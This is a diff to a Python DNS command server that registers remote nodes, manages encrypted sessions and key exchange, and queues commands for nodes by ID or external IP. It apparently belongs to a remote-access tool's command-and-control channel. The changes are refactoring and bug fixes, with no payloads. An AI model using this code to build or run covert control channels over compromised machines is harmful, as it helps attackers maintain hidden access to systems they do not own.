@@ -88,7 +88,7 @@ class Node(ExpirableObject):
         'node', 'cid', 'version', 'commands'
     )
 
-    def __init__(self, node, timeout, cid=31337, version=1, commands=[]):
+    def __init__(self, node, timeout, cid=0x31337, version=1, commands=[]):
         super(Node, self).__init__(timeout)
         self.node = node
         self.cid = cid
@@ -338,7 +338,7 @@ class DnsCommandServerHandler(BaseResolver):
     @locked
     def find_nodes(self, node):
         if node is None:
-            return self.nodes.itervalues()
+            return list(self.nodes.itervalues())
 
         if type(node) in (str,unicode):
             node = [ convert_node(x) for x in node.split(',') ]
@@ -489,6 +489,8 @@ class DnsCommandServerHandler(BaseResolver):
         node_blob = ''
         node = None
         cid = None
+        spi = 0
+        nonce = 0
         version = 1
         csum_check = None
         csum_gen = None
@@ -521,6 +523,9 @@ class DnsCommandServerHandler(BaseResolver):
 
         payload = encoder.decode(data+node_blob, nonce, symmetric=True)
 
+        logger.debug('NONCE: {:08x} SPI: {:08x} NODE_BLOB: {}'.format(
+            nonce, spi, bool(node_blob)))
+
         if node_blob:
             offset_node_blob = len(payload) - (1+8+6)
             payload, node_blob = payload[:offset_node_blob], payload[offset_node_blob:]
@@ -535,9 +540,44 @@ class DnsCommandServerHandler(BaseResolver):
             csum_gen = encoder.gen_csum
 
         elif not self.allow_v1:
-            raise DeprecatedVersion()
+            raise DeprecatedVersion(version)
 
         return payload, session, nonce, node, cid, version, csum_check, csum_gen
+
+    def _new_node_from_session(self, session):
+        if not session.system_info:
+            return
+
+        nodeid = session.system_info['node']
+        extip = str(session.system_info['external_ip'])
+
+        node = Node(
+            nodeid, self.timeout,
+            commands=self.node_commands.get(nodeid)
+        )
+
+        self.nodes[nodeid] = node
+
+        for command in self.node_commands.get(extip, []):
+            node.add_command(command)
+
+        return node
+
+    def _new_node_from_systeminfo(self, command):
+        nodeid = command.node
+        extip = str(command.external_ip)
+
+        node = Node(
+            command.node, self.timeout,
+            commands = self.node_commands.get(nodeid)
+        )
+
+        self.nodes[nodeid] = node
+
+        for command in self.node_commands.get(extip, []):
+            node.add_command(command)
+
+        return node
 
     def _cmd_processor(self, command, session, node, cid, version, csum_gen, csum_check):
         logger.debug('command={}/{} session={} / node commands={} / node = {} / cid = {}'.format(
@@ -560,22 +600,23 @@ class DnsCommandServerHandler(BaseResolver):
                 session.bump()
 
             if session and not node:
-                if session.node in self.nodes:
-                    self.nodes[session.node].bump()
+                if not session.node in self.nodes:
+                    node = self._new_node_from_session(session)
+                else:
+                    node = self.nodes[session.node]
+
+                if node:
+                    node.bump()
 
         if isinstance(command, Poll) and session is None:
             if not self.kex:
                 if node:
-                    return node.commands
-
-                elif self.node_commands and not self.commands:
-                    pass
+                    return node.commands or [
+                        Policy(self.interval, self.kex)
+                    ]
 
                 elif self.commands:
                     return self.commands
-
-                else:
-                    return [Policy(self.interval, self.kex)]
 
             return [Policy(self.interval, self.kex), Poll()]
 
@@ -586,6 +627,8 @@ class DnsCommandServerHandler(BaseResolver):
                         command.amount, len(node.commands)))
 
                 node.commands = node.commands[command.amount:]
+
+            return [Ack(1)]
 
         elif isinstance(command, Exit):
             if session and session.system_info:
@@ -610,20 +653,18 @@ class DnsCommandServerHandler(BaseResolver):
 
         elif isinstance(command, SystemInfo) and not session:
             extip = str(command.external_ip)
+            commands = []
 
             if not node:
                 with self.lock:
                     if not command.node in self.nodes:
-                        self.nodes[command.node] = Node(
-                            command.node, self.timeout,
-                            commands = self.node_commands.get(node)
-                        )
-
+                        node = self._new_node_from_systeminfo(command)
+                    else:
                         node = self.nodes[command.node]
 
-                        if extip in self.node_commands:
-                            for command in self.node_commands[extip]:
-                                node.add_command(command)
+                    node.bump()
+
+                    commands = node.commands or [ SystemInfo() ]
 
             logger.debug('SystemStatus + No session + node_commands: {}/{} in {}?'.format(
                 node, extip, node.commands))
@@ -657,9 +698,14 @@ class DnsCommandServerHandler(BaseResolver):
                     command.amount, len(session.commands)))
             session.commands = session.commands[command.amount:]
 
+            return [Ack(1)]
+
         elif isinstance(command, SystemInfo) and session is not None:
+            new_session = not bool(session.system_info)
             session.system_info = command.get_dict()
-            self.on_new_session(session)
+
+            if new_session:
+                self.on_new_session(session)
 
         elif isinstance(command, Kex):
             with self.lock:
@@ -674,7 +720,9 @@ class DnsCommandServerHandler(BaseResolver):
                         self.timeout
                     )
 
-                encoder = self.sessions[command.spi].encoder
+                session = self.sessions[command.spi]
+
+                encoder = session.encoder
                 response, key = encoder.process_kex_request(command.parcel)
                 logger.debug('kex:key={}'.format(binascii.b2a_hex(key[0])))
 
